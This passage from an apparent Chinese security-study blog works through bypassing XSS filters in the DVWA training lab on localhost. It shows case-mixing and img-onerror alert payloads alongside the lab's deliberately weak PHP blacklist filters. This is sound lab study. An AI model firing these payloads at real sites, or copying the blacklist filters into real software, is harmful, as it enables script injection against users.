alt="image-20230416155137551"></p><p>失败</p><p>message直接没了……可能是过滤掉了尖括号</p><h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );<span class="comment">//返回去掉两边空格的字符串</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );<span class="comment">//addslashes 向串中‘“\这些预定义字符添加反斜杠，strip_tags：剥去字符串中的 HTML 标签</span></span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );<span class="comment">//htmlspecialchars函数 老朋友</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第8行是对评论消息做过滤，非常全面，无懈可击</p><p>第14行对名字做过滤，只替换script标签，老毛病了。实战很难遇到这种代码。</p><h3 id="安全等级：high"><a href="#安全等级：high" class="headerlink" title="安全等级：high"></a>安全等级：high</h3><h4 id="猜测与尝试-1"><a href="#猜测与尝试-1" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>故技重施：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416161212287.png" alt="image-20230416161212287"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416161342846.png" alt="image-20230416161342846"></p><p>成功 img标签真好用。</p><h4 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码"></a>查看源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第15行，还是只过滤了script标签，其他标签没过滤</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>img比script标签  更好用，但是如果做了addslashes、strip_tags、htmlspecialchars三重过滤 这就有点麻烦了</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（二）</title>
      <link href="/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/04/16/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS的绕过姿势（二）"><a href="#XSS的绕过姿势（二）" class="headerlink" title="XSS的绕过姿势（二）"></a>XSS的绕过姿势（二）</h1><p>本章提及的几种姿势将在dvwa靶场进行演示</p><h2 id="文本框反射型XSS的绕过姿势"><a href="#文本框反射型XSS的绕过姿势" class="headerlink" title="文本框反射型XSS的绕过姿势"></a>文本框反射型XSS的绕过姿势</h2><h3 id="安全的等级：Medium"><a href="#安全的等级：Medium" class="headerlink" title="安全的等级：Medium"></a>安全的等级：Medium</h3><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230415232835425.png" alt="image-20230415232835425"></p><p>URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=XXX#</span><br></pre></td></tr></table></figure><h4 id="猜测与尝试"><a href="#猜测与尝试" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>肯定有过滤，但不知道过滤了什么</p><p>先简单试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230415233315874.png" alt="image-20230415233315874"></p><p>回显的script标签消失了，可能是被过滤掉了。</p><p>猜测是黑名单过滤，先试试大小写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;sCript&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230415233611533.png" alt="image-20230415233611533"></p><p>成功 推测是简单过滤掉了script标签。</p><p>php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然</p><h3 id="安全等级high"><a href="#安全等级high" class="headerlink" title="安全等级high"></a>安全等级high</h3><h4 id="猜测与尝试-1"><a href="#猜测与尝试-1" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>故技重施</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;sCript&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416000229385.png" alt="image-20230416000229385"></p><p>果然失败</p><p>注意到还留下了个右尖括号</p><p>换img标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;#</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230416000456771.png" alt="image-20230416000456771"></p><p>成功了！ 这是我没想到的，这么low……</p><p>看来还是对黑名单过滤script标签。。</p><p>看下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原来是直接把符合这条正则的串给替换掉</p><p>那绕过方法可多了去了。。</p><p>例如各种js事件 onclick onerror之类的</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>dvwa的反射型有点水……emmm</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的绕过姿势（一）</title>
      <link href="/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="xss的绕过姿势（一）"><a href="#xss的绕过姿势（一）" class="headerlink" title="xss的绕过姿势（一）"></a>xss的绕过姿势（一）</h1><p>本章提及的几种姿势将在dvwa靶场进行演示</p><h2 id="下拉列表DOM型XSS的绕过姿势"><a href="#下拉列表DOM型XSS的绕过姿势" class="headerlink" title="下拉列表DOM型XSS的绕过姿势"></a>下拉列表DOM型XSS的绕过姿势</h2><h3 id="安全等级：Medium"><a href="#安全等级：Medium" class="headerlink" title="安全等级：Medium"></a>安全等级：Medium</h3><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413193725293.png" alt="image-20230413193725293"></p><p>URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_d/?default=English</span><br></pre></td></tr></table></figure><h4 id="猜测与尝试"><a href="#猜测与尝试" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>注意到有下拉列表，且在URL中修改default=后面的值时能回显至页面的下拉列表中</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_d/?default=xxxxxxxx</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413194753854.png" alt="image-20230413194753854"></p><p>尝试提交payload</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195409867.png" alt="image-20230413195409867"></p><p>提交后发现default后面的值又变回English了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195320527.png" alt="image-20230413195320527"></p><p>猜测是做了过滤，检测到尖括号或者关键词就替换回  English</p><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原来是检测到  &lt;script  就马上重定向</p><p>尝试大小写绕过</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195758325.png" alt="image-20230413195758325"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413195832077.png" alt="image-20230413195832077"></p><p>失败，查资料后发现stripos()函数是不区分大小写的</p><blockquote><p>stripos () 函数查找字符串在另一字符串中第一次出现的位置（<strong>不区分大小写</strong>）。 注释： stripos () 函数是不区分大小写的。</p></blockquote><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>注意到关键点：下拉列表</p><p>下拉列表html源码如下</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413200331330.png" alt="image-20230413200331330"></p><p>考虑让下拉列表提前闭合，让回显的选项暴露在外。</p><p>闭合直接闭合 select 标签“：(不用担心没有闭合option标签，浏览器很智能的，会给你补全)</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413200945750.png" alt="image-20230413200945750"></p><p>成功，选项都暴露在外边了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413201246205.png" alt="image-20230413201246205"></p><p>那么换成xss代码（script标签被过滤了，换img标签）</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413201427653.png" alt="image-20230413201427653"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413201516611.png" alt="image-20230413201516611"></p><p>成功。</p><h3 id="安全等级：high"><a href="#安全等级：high" class="headerlink" title="安全等级：high"></a>安全等级：high</h3><h4 id="猜测与尝试-1"><a href="#猜测与尝试-1" class="headerlink" title="猜测与尝试"></a>猜测与尝试</h4><p>难度提升，继续上传上面构造的payload</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202039408.png" alt="image-20230413202039408"></p><p>马上被重定向了</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202111895.png" alt="image-20230413202111895"></p><p>猜测1：img标签被过滤</p><p>猜测2：select标签被过滤</p><p>猜测3：无论在default后面加什么都不会生效</p><p>进行验证：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202252042.png" alt="image-20230413202252042"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202617389.png" alt="image-20230413202617389"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413202324322.png" alt="image-20230413202324322"></p><p>发现无论在default后面输入什么都会被重定向</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原来是进行了白名单过滤，只允许提交以上的值</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>锚点注入技术的运用</p><blockquote><p>锚点注入： 在URL的井号后面添加JavaScript脚本是一种称为“锚点注入”的技术，它可以实现在页面加载时执行JavaScript代码。但是，这种技术并不是所有浏览器都支持，而且也存在一些安全风险。</p><p>如果浏览器支持锚点注入，那么在URL的井号后面添加JavaScript脚本是可以运行的。例如，以下URL会在页面加载时弹出一个警告框：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page.html#&lt;script&gt;alert(&#x27;Hello, world!&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>但是，为了保证网站的安全性，大多数现代浏览器已经禁止了锚点注入这种技术。因此，不建议在URL中使用锚点注入来执行JavaScript代码，而应该使用更安全的方法，如在HTML文档中嵌入JavaScript代码或在外部JavaScript文件中编写代码。</p></blockquote><p>关键： 在井号后面添加javascript脚本</p><p>在URL后面加井号，在井号后面随便加点什么</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204816325.png" alt="image-20230413204816325"></p><p>没有被重定向！</p><p>接下来 换成js脚本</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413204911747.png" alt="image-20230413204911747"></p><p>第一次回车没反应，第二次回车成功执行alert语句</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413205049632.png" alt="image-20230413205049632"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413210134469.png" alt="image-20230413210134469"></p><p>这是是GPT关于我以上疑问的解释。<strong>我信你个鬼！！！！</strong></p><p>还得靠自己琢磨：</p><h4 id="分析新的问题"><a href="#分析新的问题" class="headerlink" title="分析新的问题"></a>分析新的问题</h4><p>在井号后面随便加点什么东西：如aaaa</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413210940178.png" alt="image-20230413210940178"></p><p>发现第一次回车时，页面下拉列表选中的还是English</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413211120141.png" alt="image-20230413211120141"></p><p>第二次回车时，下拉列表中才变成English#aaaa</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413211219895.png" 